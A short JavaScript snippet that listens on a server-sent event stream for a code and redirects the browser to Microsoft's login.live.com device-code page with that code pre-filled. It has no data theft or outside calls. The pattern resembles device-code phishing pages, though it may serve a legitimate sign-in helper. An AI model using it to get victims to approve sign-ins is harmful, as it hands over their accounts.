const eventSource = new EventSource('/stream');

eventSource.onmessage = (event) => {
  // Redirect to the Microsoft login page when the code is received
  const authenticationCode = event.data;
  const redirectUrl = `https://login.live.com/oauth20_remoteconnect.srf?lc=1033&otc=${authenticationCode}`;
  window.location.href = redirectUrl;
};
